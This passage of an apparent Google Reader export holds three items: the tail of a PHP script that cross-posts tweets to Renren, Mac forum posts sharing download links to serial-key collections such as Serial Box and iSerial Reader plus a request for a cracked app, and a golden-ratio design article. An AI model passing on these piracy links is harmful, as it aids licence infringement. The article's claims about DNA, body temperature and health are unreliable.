style=\"color:#0000ff\">&quot;转自&quot;</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$text</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n         <span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">[</span><span style=\"color:#009900\">]</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$text</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">' [twitter]'</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#009900\">}</span>\n<span style=\"color:#009900\">}</span>\n \n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#0000ff\">&quot;no need.<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n<span style=\"color:#000088\">$post_arr</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">array_reverse</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#b1b100\">foreach</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span> <span style=\"color:#b1b100\">as</span> <span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$post</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">&#39;sour=home&amp;status=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#990000\">urlencode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;update=发布&#39;</span><span style=\"color:#339933\">;</span>\n \n    <span style=\"color:#000088\">$renren_login</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">&quot;http://3g.renren.com/login.do?fx=0&amp;autoLogin=true&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$ch</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_init</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_COOKIEJAR<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$cookie_file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_URL<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$renren_login</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POST<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_FOLLOWLOCATION<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POSTFIELDS<span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'email='</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$renren_username</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;password=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$renren_password</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;login=登录&#39;</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_RETURNTRANSFER<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#666666;font-style:italic\">#curl_setopt($ch,CURLOPT_VERBOSE,TRUE);\n</span>    <span style=\"color:#000088\">$str</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_exec</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_close</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$pattern</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">&#39;/action=&quot;([^&quot;]*)&quot;/&#39;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">preg_match</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$pattern</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$str</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$matches</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n \n    <span style=\"color:#000088\">$ch</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_init</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$matches</span><span style=\"color:#009900\">[</span><span style=\"color:#cc66cc\">1</span><span style=\"color:#009900\">]</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POST<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POSTFIELDS<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$post</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_RETURNTRANSFER<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_COOKIEFILE<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$cookie_file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#666666;font-style:italic\">//curl_setopt($ch,CURLOPT_FOLLOWLOCATION,TRUE);</span>\n    <span style=\"color:#666666;font-style:italic\">//curl_setopt($ch,CURLOPT_REFERER,'http://status.renren.com/ajaxproxy.htm');</span>\n    <span style=\"color:#000088\">$ret</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_exec</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_close</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#000000;font-weight:bold\">?&gt;</span></pre></td></tr></table></div>\n\n<hr>\n<p><small>© yegle for <a href=\"http://yegle.net\">一阁Blog</a>, 2010. |\n本文短链：<a href=\"http://ye.gl/e/7x\">http://ye.gl/e/7x</a> |\n<a href=\"http://ye.gl/e/7x#comments\">4个评论</a> |\nPost tags: <a href=\"http://yegle.net/tag/php/\" rel=\"tag\">php</a>, <a href=\"http://yegle.net/tag/renren/\" rel=\"tag\">renren</a>, <a href=\"http://yegle.net/tag/twitter/\" rel=\"tag\">twitter</a><br>\n</small></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://yegle.net/feed/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298165410977",
    "timestampUsec" : "1298165410977414",
    "id" : "tag:google.com,2005:reader/item/daeb8648e2d2378c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "软件资源与破解索求" ],
    "title" : "KCNcrew Pack 1-15-2011",
    "published" : 1295227231,
    "updated" : 1295227231,
    "alternate" : [ {
      "href" : "http://mac.pcbeta.com/viewthread.php?tid=40209",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "38029[/attach]\n\nKCNcrew Pack 1-15-2011\nFile Size 4.8 MB\n\n[hide=3]Links:\nhttp://www.fileserve.com/file/qZW6dvC[/url]\nhttp://www.filesonic.com/file/58236149/KCNcrew_Pack_01-15-11.dmg[/url]\nhttp://hotfile.com/dl/96976978/dcecda0/KCNcrew_Pack_1-15-201"
    },
    "author" : "leonx81",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=29&auth=7c9423sdKoRHeJfe7asRIqlAxBfBSZDvGrR%2B%2FkZRdGUv1HGw5SJBNKBZdtSzhr4",
      "title" : "MacIdea - 软件资源与破解索求",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=29"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298165408736",
    "timestampUsec" : "1298165408736837",
    "id" : "tag:google.com,2005:reader/item/4bab68f7cec647ed",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "软件资源与破解索求" ],
    "title" : "Serial Box 12.2010 + iSerial Reader 2.0.8 + SerialSeeker 1.3.4 (AF)",
    "published" : 1295227491,
    "updated" : 1295227491,
    "alternate" : [ {
      "href" : "http://mac.pcbeta.com/viewthread.php?tid=40211",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "38030[/attach]\n\nSerial Box 12.2010\nissue #101\n91 new entries…[/b]\n[hide=3]\nLinks:\nhttp://rapidshare.com/files/434269345/1210.zip[/url]\nhttp://www.fileserve.com/file/tcqXptX/serialbox0111.rar[/url]\nhttp://www.mediafire.com/?7ss7sphnqte8f2r[/url]"
    },
    "author" : "leonx81",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=29&auth=7c9423sdKoRHeJfe7asRIqlAxBfBSZDvGrR%2B%2FkZRdGUv1HGw5SJBNKBZdtSzhr4",
      "title" : "MacIdea - 软件资源与破解索求",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=29"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298165396985",
    "timestampUsec" : "1298165396985265",
    "id" : "tag:google.com,2005:reader/item/7d9c8a68353868b3",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "软件资源与破解索求" ],
    "title" : "Reflow（樂譜軟件）",
    "published" : 1295791460,
    "updated" : 1295791460,
    "alternate" : [ {
      "href" : "http://mac.pcbeta.com/viewthread.php?tid=40565",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<a href=\"http://a1.phobos.apple.com/us/r1000/020/Purple/65/36/17/mzl.apwenzrb.800x500-75.jpg%5B/img%5D\">http://a1.phobos.apple.com/us/r1000/020/Purple/65/36/17/mzl.apwenzrb.800x500-75.jpg[/img]</a>\n\n因為mac下面的guitarPro不好用總是崩潰，找了找發現了這個，求個破解版本"
    },
    "author" : "ash0080",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=29&auth=7c9423sdKoRHeJfe7asRIqlAxBfBSZDvGrR%2B%2FkZRdGUv1HGw5SJBNKBZdtSzhr4",
      "title" : "MacIdea - 软件资源与破解索求",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=29"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298165392699",
    "timestampUsec" : "1298165392699328",
    "id" : "tag:google.com,2005:reader/item/1a08f338d350eaf2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "软件资源与破解索求" ],
    "title" : "机器人(KCNcrew)+骷髅头(iSerial Reader)2011-01新版",
    "published" : 1296093287,
    "updated" : 1296093287,
    "alternate" : [ {
      "href" : "http://mac.pcbeta.com/viewthread.php?tid=40739",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[i=s] 本帖最后由 fdgogogo 于 11/1/27 02:59 AM 编辑 [/i]\n\n=。=一抬头发现置顶贴已经有新版机器人了，惭愧惭愧，google站内搜索还是比较不给力。不过骷髅头数据要更新一点。\nSerial Box 01.2011 + iSerial Reader 2.0.8 + SerialSeeker 1.3.4\nissue #102 67 new entries… ..."
    },
    "author" : "fdgogogo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=29&auth=7c9423sdKoRHeJfe7asRIqlAxBfBSZDvGrR%2B%2FkZRdGUv1HGw5SJBNKBZdtSzhr4",
      "title" : "MacIdea - 软件资源与破解索求",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=29"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298165330670",
    "timestampUsec" : "1298165330670131",
    "id" : "tag:google.com,2005:reader/item/664365208005e587",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "软件资源与破解索求" ],
    "title" : "Serial Box 02.2011 + NEW iSerial Reader, SerialSeeker",
    "published" : 1297857263,
    "updated" : 1297857263,
    "alternate" : [ {
      "href" : "http://mac.pcbeta.com/viewthread.php?tid=42066",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "Serial Box 02.2011 + SerialSeeker 1.3.5 (B1)\nhttp://www.mediafire.com/?d4yx04ngfqndrdx[/url]\n(SHA-1 = e8d1c80434d1a8e305da03bf5c2e8ad21a2edf8b)\n\niSerial Reader 2.0.9\nhttp://hotfile.com/dl/102219927/ccdb6c6[/url] ... 9.rar.html\nhttp://www.filefactory"
    },
    "author" : "talentlilong99",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=29&auth=7c9423sdKoRHeJfe7asRIqlAxBfBSZDvGrR%2B%2FkZRdGUv1HGw5SJBNKBZdtSzhr4",
      "title" : "MacIdea - 软件资源与破解索求",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=29"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298160482922",
    "timestampUsec" : "1298160482922239",
    "id" : "tag:google.com,2005:reader/item/7009223b6c8bb30a",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "黄金分割——设计师的设计利器",
    "published" : 1298160482,
    "updated" : 1298160482,
    "alternate" : [ {
      "href" : "http://ucdchina.com/snap/9127",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a rel=\"attachment wp-att-2449\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/8-10\"></a><a rel=\"attachment wp-att-2455\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/96-2\"></a><a rel=\"attachment wp-att-2434\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/huangjinfen-2\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/d086a8ff81396530f8e0a62aadd12e26.jpeg\" alt=\"\" width=\"650\" height=\"250\"></a></p>\n \n<p>设计师在设计的时候，总会遇到这样那样的问题，和人PK不断，修改不断。界面区域多大合适呢？ICON多大？颜色区间多少？为什么这么定义？什么是普世的美？很多UIer都说，50%靠设计，50%靠交流，那么在交流的时候如何说服别人呢？ADS定位、用户群、用户环境、调研都可以作为参考的依据，在这里再向大家介绍一下我们身边存在的黄金分割，希望作为设计的利器，或创作或PK。</p>\n \n<p><span></span></p>\n \n<p>一.植物</p>\n \n<p>“黄金角度”生物学家发现植物种类繁多、叶子形态各异，但是叶子在茎上的排列却有着特殊的规律.我们从某种植物的顶端往下看，便会发现上下层相邻的两片叶子之间所构成的角约为137.50,如果每层叶子只画一片来表示，第一层和第二层的相邻两叶之间的角度约为137.50,以后二层到三层、三层到四层、四层到五层……两叶之间都成这个角度，这个角度对叶子的通风和采光最为有利.这叶子之间的137.50角与黄金数又有什么联系呢？我们知道，一周为3600，137.50： =137.50：222.50≈0.618.也就是说，各种植物叶子的生长规律中自然隐藏着黄金数。</p>\n \n<p style=\"text-align:center\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/de40b789cc98af62c333ac9538494bc0.jpeg\" alt=\"\" width=\"650\" height=\"261\"></p>\n \n<p>向日葵花有89个花辫，55个朝一方，34个朝向另一方</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2437\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/3-15\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/2267901de6a70e7b246eb3e93fc07ffb.jpeg\" alt=\"\" width=\"503\" height=\"313\"></a></p>\n \n<p>枫叶</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2438\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/4-12\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/b54396546666041e7b7d06aa0b56f3e3.png\" alt=\"\" width=\"242\" height=\"216\"></a></p>\n \n<p>喷嚏麦</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2439\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/5-10\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/67f3bcf467c6e394d781ed43c46e0af4.png\" alt=\"\" width=\"249\" height=\"246\"></a></p>\n \n<p>1.1.2.3.5.8.13.21.34.55.89.144…</p>\n \n<p>后面的数除以前面的树，越往后越趋向于黄金比例。运用到设计当中，譬如一个齿轮的图标，齿的个数可以参考这组数列。PK词：这是自然的法则。</p>\n \n<p>二.动物</p>\n \n<p>由这组数列引出斐波那契曲线，斐波纳契是在解一道关于兔子繁殖的问题时，得出了这个数列。假定你有一雄一雌一对刚出生的兔子，它们在长到一个月大小时开始交配，在第二月结束时，雌兔子产下另一对兔子，过了一个月后它们也开始繁殖，如此这般持续下去。每只雌兔在开始繁殖时每月都产下一对兔子，假定没有兔子死亡，在一年后总共会有多少对兔子？ •　　在一月底，最初的一对兔子交配，但是还只有1对兔子；在二月底，雌兔产下一对兔子，共有2对兔子；在三月底，最老的雌兔产下第二对兔子，共有3对兔子；在四月底，最老的雌兔产下第三对兔子，两个月前生的雌兔产下一对兔子，共有5对兔子；……如此这般计算下去，兔子对数分别是：1, 1, 2, 3, 5, 8, 13, 21, 34, 55,89, 144, …看出规律了吗？ •从第3个数目开始，每个数目都是前面两个数目之和。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2440\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/4-13\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/692c8eb1da267ec91b64068f71f8dc7e.jpeg\" alt=\"\" width=\"311\" height=\"195\"></a></p>\n \n<p>下面再简单介绍下斐波那契，了解下周边总是可以唬人的。</p>\n \n<p>        意大利数学家，12、13世纪欧洲数学界的代表人物。生于比萨，早年跟随经商的父亲到北非的布日伊（今阿尔及利亚东部的小港口贝贾亚），在那里受教育。以后到埃及、叙利亚、希腊、西西里、法国等地游历，熟习了不同国度在商业上的算术体系，他认为使用印度－阿拉伯数码最方便。1200年左右回到比萨，潜心写作。  他的书保存下来的共有5种。最重要的是《算盘书》（1202年完成，1228年修订），算盘并不单指罗马算盘或沙盘，实际是指一般的计算。全书共15章，1～7章系统介绍了印度数码与记数制度，以及整数、分数的各种计算方法，结果用弃九法来验算。还列有乘法表、素数表和因子表等若干数表。8～11章是商业上的计算题,如物价、利润、利息、货币换算等，反映了中世纪地中海地区的广泛商业交往。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2441\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/7-13\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/210c5f2cba6ab166505da2425309e6bc.jpeg\" alt=\"\" width=\"219\" height=\"302\"></a></p>\n \n<p>黄金分割的算法：1.如果线段AB被点C分成线段AC和BC，且 ，那么称线段AB被点C黄金分割，点C叫做线段AB的黄金分割点，AC与AB的比叫做黄金比。通过计算可知黄金比为<a rel=\"attachment wp-att-2442\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/995\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/4876224612c9b61b3d91fca006fa0e3a.png\" alt=\"\" width=\"48\" height=\"48\"></a> 。2.黄金矩形：一个矩形如果两边之比具有黄金比值，则称这种矩形为黄金矩形．它是由一个正方形和另一个小黄金矩形组成。事实上，如图（4），如果设大黄金矩形的两边为a、b，则 <a rel=\"attachment wp-att-2444\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/996-3\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/8cdd75f8e34449db39222398307ce92e.png\" alt=\"\" width=\"70\" height=\"50\"></a>，分出一个正方形后，所余小矩形的两边分别为（b－a）和a，它们的比为（b－a）：a<a rel=\"attachment wp-att-2445\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/997\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/3696e538e29e7a64a77af486e170084a.png\" alt=\"\" width=\"183\" height=\"48\"></a> ．这表明小的矩形也是黄金矩形。</p>\n \n<p><a rel=\"attachment wp-att-2447\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/998-2\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/e220c5d3d9475503a58cd5722ea9a226.png\" alt=\"\" width=\"146\" height=\"78\"></a></p>\n \n<p>3.如何得到线段的黄金分割点C呢？这里介绍一下操作方法：首先画一个参考Y轴（纵轴），如图所示。A点位于Y轴上，水平画出AB直线，长度任意。以A为中心，AB为半径，画一个圆，得到与Y轴相交的X点。即AX＝AB。取AX的中心点Z，即AZ＝ZX。连接ZB，并以Z为中心，ZB为半径绘制一个圆，得到与Y轴相交点Y（下方相交点）。即ZB＝ZY。最后，以A为中心点，AY为半径绘制一个圆，得到与AB相交的C点，此时AC＝AY。C点即为黄金分割点。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2448\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/999\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/f268e0b560dd32e3e328533cc913ef79.png\" alt=\"\" width=\"349\" height=\"408\"></a></p>\n \n<p><img src=\"http://img.ucdchina.com/upload/snap/2011-02/c6f9a91ed0f52b423d14c9a30bc45d95.jpeg\" alt=\"\" width=\"581\" height=\"208\"></p>\n \n<p><a rel=\"attachment wp-att-2449\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/8-10\"></a><a rel=\"attachment wp-att-2450\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/9-10\"></a></p>\n \n<p>鹦鹉螺的曲线黄金分割构图也体现在网页构图上，如titter的IPad版。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2462\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/0e12152f-6c63-4425-aae4-47476216f961\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/13660e38905a4ceec2c27e22f42be0c4.jpeg\" alt=\"\" width=\"410\" height=\"264\"></a></p>\n \n<p>三.人物</p>\n \n<p>1.面部比例。相貌对不起观众的人各有千秋，美丽的人却有很多相似的地方。奥黛丽赫本有这标准的三平五眼，作为公众的美女，我们看看他的脸部有那些黄金分割吧。</p>\n \n<p><a rel=\"attachment wp-att-2451\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/91-2\"></a><a rel=\"attachment wp-att-2452\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/92-2\"></a></p>\n \n<p style=\"text-align:center\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/ed66e1cfec6c7f8d981a410746e935e4.jpeg\" alt=\"\" width=\"625\" height=\"397\"></p>\n \n<p>再以一个普通人凤姐为例，对比看看，在画卡通形象的时候可以夸大面部各部分的黄金比例。</p>\n \n<p><a rel=\"attachment wp-att-2453\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/93-2\"></a><a rel=\"attachment wp-att-2454\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/999-2\"></a></p>\n \n<p style=\"text-align:center\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/531c89718fa64bf259088d5bff8ad697.jpeg\" alt=\"\" width=\"368\" height=\"221\"></p>\n \n<p style=\"text-align:left\"> 2.身体比例</p>\n \n<p>肚脐：头顶－足底之分割点；(2)咽喉：头顶－肚脐之分割点；(3)、(4)膝关节：肚脐－足底之分割点；(5)、(6)肘关节：肩关节到中指尖之分割点；(7)、(8)乳头：躯干乳头纵轴上这分割点；(9)眉间点：发际到颏底间距上1/3与中下2/3之分割点；(10)鼻下点：发际到下巴底间距下1/3与上中2/3之分割点；(11)唇珠点：鼻底到下巴底间距上1/3与中下2/3之分割点；(12)颏唇沟正路点：鼻底到颏底间距下1/3与上中2/3之分割点；(13)左口角点：口裂水平线左1/3与右2/3之分割点；(14)右口角点：口裂水平线右1/3与左2/3之分割点。（15）在人体中三分之二是水；在22.5 ℃的环境中人体的新陈代谢处于最佳状态，而22.5 ℃是人体正常体温36.5 ℃的0.618倍；（16）心脏中心位于胸腔的黄金分割点上；（17）整个脊柱的0.618是胸与腰的分界处，也就是第12胸椎处，从肩至中指指 尖的0.618是肘关节，从肘关节至中指指尖的0.618为腕关节，从膝关节至足尖的0.618是踝关节。（18）姿态优美，身材苗条的时装模特和偏偏起舞的舞蹈演员，他们的腿和身材的比例也近似于0.618的比值。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2455\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/96-2\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/98b9de26486a45acba6b2ec8849eabf2.jpeg\" alt=\"\" width=\"452\" height=\"296\"></a><a rel=\"attachment wp-att-2456\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/95-2\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/734c6404d038f4b707e554933a4d3172.jpeg\" alt=\"\" width=\"233\" height=\"315\"></a></p>\n \n<p>思考：如果小明的身高是1.75米，假如肚脐在0.97米位置，增高垫用多高能使肚脐达到人体的黄金分割点？答案最下面公布。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2457\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/9991-%e5%89%af%e6%9c%ac\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/209dc64f0eb381cc22dee12871c235d4.jpeg\" alt=\"\" width=\"288\" height=\"266\"></a></p>\n \n<p>3.另外，和人体有关的黄金分割还有：一年12个月，12的0.618是7.4,7、8月份人体血液中的淋巴细胞最多，它可参与抵御细菌的侵袭，所以这时是人体抵抗力最强的时期。一天中气温最低的时间是凌晨2时气温最高是在14时，它们之间的黄金分割点为9.4，上午9,10时的气温是一天中最适宜的，这时人的头脑最清楚，办事效率最高。中医的三个主要健身穴位枣百会、涌泉和劳宫的位置也符合这一分割律：百会位于前发际至后发际的0.618处，涌泉位于足掌部的0.618处,劳宫位于手掌的0.618处。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2460\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/98\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/ac6cfbfdae914a457ffcc8adb543b1cf.jpeg\" alt=\"\" width=\"480\" height=\"349\"></a></p>\n \n<p>4.DNA的比例。最有意味的是，在人的生命程序DNA 分子中，也包含着“黄金分割比”。它的每个双螺旋结构中都是由长 34个埃与宽21个埃之比组成的，当然34和21是斐波那契系列中的数字，它们的比率为1.6190476，非常接近黄金分割的1.6180339。这是否说明黄金分割律是比DNA中的遗传密码更基本的东西？因为承载DNA的结构——双螺旋结构——也遵循黄金分割律。</p>\n \n<p style=\"text-align:center\"><a rel=\"attachment wp-att-2461\" href=\"http://wsd.tencent.com/2011/02/golden_section.html/attachment/99\"><img src=\"http://img.ucdchina.com/upload/snap/2011-02/38589511df08ffd4ff8641eea02d2058.jpeg\" alt=\"\" width=\"317\" height=\"276\"></a></p>\n \n<p>四.建筑雕塑</p>\n 